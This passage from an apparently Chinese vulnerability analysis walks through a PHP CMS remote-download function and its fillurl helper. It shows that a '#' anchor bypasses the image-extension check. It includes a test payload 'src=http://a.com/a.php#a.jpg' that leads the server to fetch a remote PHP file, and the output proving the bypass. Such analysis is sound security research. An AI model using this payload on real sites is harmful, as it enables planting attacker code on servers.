</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$matches</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$matche</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$matche</span><span class="p">,</span> <span class="s1">&#39;://&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">dir_create</span><span class="p">(</span><span class="nv">$uploaddir</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$remotefileurls</span><span class="p">[</span><span class="nv">$matche</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">fillurl</span><span class="p">(</span><span class="nv">$matche</span><span class="p">,</span> <span class="nv">$absurl</span><span class="p">,</span> <span class="nv">$basehref</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unset</span><span class="p">(</span><span class="nv">$matches</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$remotefileurls</span> <span class="o">=</span> <span class="nx">array_unique</span><span class="p">(</span><span class="nv">$remotefileurls</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$oldpath</span> <span class="o">=</span> <span class="nv">$newpath</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$remotefileurls</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&gt;</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;://&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span> <span class="o">||</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$upload_url</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nx">fileext</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getname</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$newfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$upload_func</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">upload_func</span><span class="p">;</span><span class="c1">//$this-&gt;upload_func = &#39;copy&#39;;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nv">$upload_func</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$newfile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$oldpath</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$k</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;downloadfiles&#39;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$newpath</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$uploadpath</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="o">@</span><span class="nx">chmod</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">,</span> <span class="mo">0777</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$fileext</span> <span class="o">=</span> <span class="nx">fileext</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$watermark</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nx">watermark</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">,</span> <span class="nv">$newfile</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">siteid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$filepath</span> <span class="o">=</span> <span class="nv">$dir</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$downloadedfile</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span> <span class="o">=&gt;</span> <span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;filepath&#39;</span> <span class="o">=&gt;</span> <span class="nv">$filepath</span><span class="p">,</span> <span class="s1">&#39;filesize&#39;</span> <span class="o">=&gt;</span> <span class="nx">filesize</span><span class="p">(</span><span class="nv">$newfile</span><span class="p">),</span> <span class="s1">&#39;fileext&#39;</span> <span class="o">=&gt;</span> <span class="nv">$fileext</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$aid</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">add</span><span class="p">(</span><span class="nv">$downloadedfile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">downloadedfiles</span><span class="p">[</span><span class="nv">$aid</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$filepath</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">str_replace</span><span class="p">(</span><span class="nv">$oldpath</span><span class="p">,</span> <span class="nv">$newpath</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>
<p><code>preg_match_all(&quot;/(href|src)=([\&quot;|']?)([^ \&quot;'&gt;]+\.($ext))\\2/i&quot;, $string, $matches)</code>而<code>$ext = 'gif|jpg|jpeg|bmp|png'</code>,正则匹配检查并提取结果</p>
</li>
<li>
<p><code>$remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);</code></p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * 补全网址
</span></span></span><span class="line"><span class="cl"><span class="sd"> *
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param	string	$surl		源地址
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param	string	$absurl		相对地址
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @param	string	$basehref	网址
</span></span></span><span class="line"><span class="cl"><span class="sd"> * @return	string	网址
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">fillurl</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="nv">$absurl</span><span class="p">,</span> <span class="nv">$basehref</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$basehref</span> <span class="o">!=</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$preurl</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;http://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ftp://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;mms://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;rtsp://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;thunde&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;emule://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ed2k://&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>  <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$basehref</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$dstr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pstr</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$okurl</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pathStep</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$surl</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$surl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$surl</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$urls</span> <span class="o">=</span> <span class="o">@</span><span class="nx">parse_url</span><span class="p">(</span><span class="nx">SITE_URL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$HomeUrl</span> <span class="o">=</span> <span class="nv">$urls</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$BaseUrlPath</span> <span class="o">=</span> <span class="nv">$HomeUrl</span> <span class="o">.</span> <span class="nv">$urls</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$BaseUrlPath</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/\/([^\/]*)\.(.*)$/&#34;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$BaseUrlPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$BaseUrlPath</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/\/$/&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$BaseUrlPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="nv">$surl</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$pos</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$surl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$okurl</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span> <span class="nv">$HomeUrl</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$surl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$surl</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">)</span> <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$surl</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$okurl</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span> <span class="nv">$BaseUrlPath</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$surl</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$urls</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$surl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$urls</span> <span class="k">as</span> <span class="nv">$u</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$u</span> <span class="o">==</span> <span class="s2">&#34;..&#34;</span><span class="p">)</span> <span class="nv">$pathStep</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$urls</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="nv">$dstr</span> <span class="o">.=</span> <span class="nv">$urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span> <span class="nv">$dstr</span> <span class="o">.=</span> <span class="nv">$urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$urls</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$BaseUrlPath</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">count</span><span class="p">(</span><span class="nv">$urls</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="nv">$pathStep</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$pstr</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nx">count</span><span class="p">(</span><span class="nv">$urls</span><span class="p">)</span> <span class="o">-</span> <span class="nv">$pathStep</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$pstr</span> <span class="o">.=</span> <span class="nv">$urls</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$okurl</span> <span class="o">=</span> <span class="nv">$pstr</span> <span class="o">.</span> <span class="nv">$dstr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$preurl</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$surl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$surl</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$okurl</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span> <span class="nv">$BaseUrlPath</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">elseif</span> <span class="p">(</span><span class="nv">$preurl</span> <span class="o">==</span> <span class="s2">&#34;http:/&#34;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ftp://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;mms://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s2">&#34;rtsp://&#34;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;thunde&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;emule:&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ed2k:/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$okurl</span> <span class="o">=</span> <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$okurl</span> <span class="o">=</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span> <span class="nv">$BaseUrlPath</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$surl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$preurl</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$okurl</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ftp://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;mms://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;rtsp://&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;thunde&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;emule:&#39;</span> <span class="o">||</span> <span class="nv">$preurl</span> <span class="o">==</span> <span class="s1">&#39;ed2k:/&#39;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$okurl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$okurl</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/^(http:\/\/)/i&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$okurl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$okurl</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\/{1,}/i&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nv">$okurl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;http://&#39;</span> <span class="o">.</span> <span class="nv">$okurl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>注意到在<code>fillurl</code>存在<code>$pos = strpos($surl, '#');    if ($pos &gt; 0) $surl = substr($surl, 0, $pos);</code>用于获取网页锚点前的路径,因此可以利用网页锚点绕过前面正则匹配</p>
<p><code>xxx#a.jpg</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$ext</span> <span class="o">=</span> <span class="s1">&#39;gif|jpg|jpeg|bmp|png&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$string</span><span class="o">=</span><span class="s2">&#34;src=http://a.com/a.php#a.jpg&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">preg_match_all</span><span class="p">(</span><span class="s2">&#34;/(href|src)=([</span><span class="se">\&#34;</span><span class="s2">|&#39;]?)([^ </span><span class="se">\&#34;</span><span class="s2">&#39;&gt;]+\.(</span><span class="si">$ext</span><span class="s2">))</span><span class="se">\\</span><span class="s2">2/i&#34;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$matches</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span> <span class="s2">&#34;src=http://a.com/a.php#a.jpg&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">&#34;src&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nx">string</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span> <span class="s2">&#34;http://a.com/a.php#a.jpg&#34;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
